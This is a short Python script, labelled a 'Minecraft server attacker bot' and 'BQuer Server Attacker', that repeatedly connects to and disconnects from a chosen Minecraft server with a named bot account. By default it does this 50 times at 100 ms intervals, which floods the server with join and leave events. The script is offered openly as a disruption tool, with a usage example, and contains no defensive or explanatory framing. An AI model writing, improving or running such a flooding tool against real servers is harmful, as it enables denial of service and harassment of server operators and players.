import time
from pyCraft import Client
import argparse

def connect_to_server(server_ip, server_port, bot_name):
    client = Client(server_ip, server_port, bot_name)
    client.connect()
    return client

def disconnect_from_server(client):
    client.disconnect()

def main(server_ip, server_port, bot_name, interval, visit_limit):
    visit_count = 1

    try:
        while visit_count <= visit_limit:
            client = connect_to_server(server_ip, server_port, bot_name)
            disconnect_from_server(client)

            visit_count += 1
            time.sleep(interval / 1000)
    except KeyboardInterrupt:
        print("\nAction Finished - BQuer Server Attacker")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Minecraft server attacker bot Using ; $ python3/python bquer.py -s 192.168.1.100 -p 25565 -n BQuer -i 100 -l 50")
    parser.add_argument("-s", "--server_ip", required=True, help="Server IP")
    parser.add_argument("-p", "--server_port", required=True, type=int, help="Server port")
    parser.add_argument("-n", "--bot_name", required=True, help="Bots Name")
    parser.add_argument("-i", "--interval", type=int, default=100, help="Join Leave MS")
    parser.add_argument("-l", "--visit_limit", type=int, default=50, help="Visit Count")

    args = parser.parse_args()

    main(args.server_ip, args.server_port, args.bot_name, args.interval, args.visit_limit)
